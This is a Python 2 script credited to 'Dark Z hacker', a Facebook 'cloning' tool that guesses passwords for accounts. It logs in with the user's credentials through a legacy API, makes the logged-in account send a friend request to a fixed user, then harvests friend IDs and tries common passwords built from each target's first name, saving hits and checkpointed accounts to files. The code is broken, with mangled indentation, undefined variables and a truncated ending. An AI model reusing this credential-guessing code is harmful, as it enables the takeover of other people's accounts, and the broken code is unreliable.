#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Dark Z hacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:darkz_hacker
##### LOGO #####
logo = """
      \033[1;91m:ЫЫЫЫЫЫ»°°ЫЫЫЫЫ»°ЫЫЫЫЫЫ»°ЫЫ»°°ЫЫ»:
      \033[1;92m:ЫЫЙННЫЫ»ЫЫЙННЫЫ»ЫЫЙННЫЫ»ЫЫє°ЫЫЙј:
      \033[1;93m:ЫЫє°°ЫЫєЫЫЫЫЫЫЫєЫЫЫЫЫЫЙјЫЫЫЫЫНј°:
      \033[1;94m:ЫЫє°°ЫЫєЫЫЙННЫЫєЫЫЙННЫЫ»ЫЫЙНЫЫ»:
      \033[1;95m:ЫЫЫЫЫЫЙјЫЫє°°ЫЫєЫЫє°°ЫЫєЫЫє°ИЫЫ»: 
      \033[1;96m:ИНННННј°ИНј°°ИНјИНј°°ИНјИНј°°ИНј:

██████╗░░█████╗░██████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██║░░██║███████║██████╔╝█████═╝░
██║░░██║██╔══██║██╔══██╗██╔═██╗░
██████╔╝██║░░██║██║░░██║██║░╚██╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
               █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█
               █▀█ █▀█ █▄▄ █░█ ██▄ █▀▄
\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDarkZ\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
\033[1;93m                 в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤ DarkZ в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
\033[1;93m                 в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤  WhatsApp  в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
\033[1;93m                 в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤ +8801978066581в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDarkZ\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93m𝕃𝕠𝕒𝕕𝕚𝕟𝕘.... \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
  \033[1;96m          в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤  в•±в–”в–”в–”в–”в•І  в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤ 
  \033[1;96m          в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤ в–•в–•в•Ів”Љв”Љв•±в–Џв–Џ в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
  \033[1;96m          в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤ в–•в–•в–‚в•±в•Ів–‚в–Џв–Џ в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
 \033[1;96m           в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤  в•Ів”Љв”Љв”Љв”Љв•±  в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
 \033[1;96m           в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤  в–•в•Ів–‚в–‚в•±в–Џ  в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
 \033[1;96m           в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤  в•±в–”в–”в–”в–”в”Љв”Љв”Љв”Љв–”в–”в–”в–”в•І  в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
  \033[1;96m          в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
       \033[1;93m    в–€в–€в–€в–€в–€в–€в–€в–’в–’Welcome To Drexa_m24в–’в–’в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤
\033[1;94mAuthor    \033[1;91m: \033[1;91mdarkzhacker
\033[1;94mDarkZ\033[1;91m: \033[1;91в–’в–“в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€]99.9
\033[1;94mFacebook  \033[1;91m: \033[1;91mTeam Dark Z
\033[1;94mWhatsapp  \033[1;91m: \033[1;91m+8801978066581
\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"""
jalan('\033[1;92m   .........................DarkZ.........................:')
jalan("\033[1;93m   в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤ 𝕨𝕖𝕝𝕔𝕠𝕞𝕖 𝕥𝕠 𝔻𝕒𝕣𝕜 ℤ в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤   ")
jalan('\033[1;93m вћ в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€Login New Acountв”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€  ')
jalan('\033[1;93m вћ в”€в”€в”€в”€в”€в”€в”€ Checkpoint Account will be Open After 7 Days в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€  ')
jalan("\033[1;93m вћ в”€в”€Only for Bangladeshi accounts”€ ")
jalan("\033[1;93m вћ в”€в”€в”€в”€в”€в”€в”€в”€WhatsApp Num :  +8801978066581в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€в”€")
print "\033[1;95m   в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mLogin Dark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"

CorrectUsername = "Dark"
CorrectPassword = "hacker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;94mв—Ґв—¤в—Ґв—¤рџ“‹ \x1b[1;91mTool Username \x1b[1;91mВ»В» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;94mв—Ґв—¤в—Ґв—¤рџ”‘\x1b[1;91mTool Password \x1b[1;91mВ»В» \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:darkz_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.facebook.com/Team.Dark.Z666/')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/Team.Dark.Z666/')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;92m     Notice:вћ \033[1;93mStay Home Stay Safe Save lives Save Bangladesh' )
                jalan(' \033[1;92m     Notice:вћ \033[1;97mPray NAMAZ five time Daily' )
                jalan(' \033[1;92m     Notice:вћ \033[1;97mWear mask on your mouth every time ' )
                jalan(' \033[1;92m     Notice:вћ \033[1;97mDont go to in markets ' )
		jalan(' \033[1;92m     Notice:вћ \033[1;97mWash your hands every 1 hour' )
                jalan(' \033[1;92m    Warning:вћ \033[1;95mFor Cloning use only Bangladeshi Link' )
		print "\033[1;95m      в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂў\033[1;96mDarkZ\033[1;95mвЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"
		print('\033[1;93mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤LOGIN WITH FACEBOOKв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤' )
		print('	' )
		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful...'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:darkz_hacker
	print logo
	print "  \033[1;95mВ«-----в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤----\033[1;93mLogged in User Info\033[1;95m----в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤-----В»"
	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
	print "\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m--\033[1;92m> \033[1;92m1.\x1b[1;91mClone From Friend List..."
	print "\033[1;96m--\033[1;92m> \033[1;92m2.\x1b[1;91mClone From Indian ID Link Public Frendlist..."
	print "\033[1;96m--\033[1;91m> \033[1;91m0.\033[1;94mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"
		jalan('\033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[в™Ў] \033[1;92mEnter ID link\033[1;93m: \033[1;97m")
		print "\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
	jalan('\033[1;92mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94mВ«-----\x1b[1;93mв™ЎTo Stop Process Press CTRL+Zв™Ў\033[1;94m----В»"
	print "\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"
	jalan(' \033[1;93m .......................Cloning Start plzzz Wait....................... ')
	print "\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤\033[1;96mDark Z\033[1;95mв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤вЂўв—€вЂўв—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤в—Ґв—¤"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:dark_hacker
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('123456')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = (j['first_name']+'islam')
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = (j['first_name']+'mohammad')
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = (j['first_name']+'khan')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = (j['first_name']+'786786')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = (j['first_name']+'123123')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														               else:
													                           pass8 = (j['first_name']+'101010')
													                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													                           q = json.load(data)
													                           if 'access_token' in q:
														                     print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass8
														                     oks.append(user+pass8)
													                                else:
														                                if 'www.facebook.com' in q["error_msg"]:
															                          print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass8
															                          cek = open("out/checkpoint.txt", "a")
															                          cek.write(user+"|"+pass8+"\n")
															                          cek.close()
															                          cekpoint.append(user+pass8)
                                                                              else:
													pass9 = (j['first_name']+'202020')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mвћ{Hack}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass9
														oks.append(user+pass9)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mвћ{CP}\x1b[1;97m-\x1b[1;94mв—Џ\x1b[1;97m-' + user + '-\x1b[1;94mв—Џ\x1b[1;97m-' + pass9
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass9+"\n")
															cek.close()
															cekpoint.append(user+pass9)
                                                                              else:
													pass10 = (j['first_name']+'303030')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
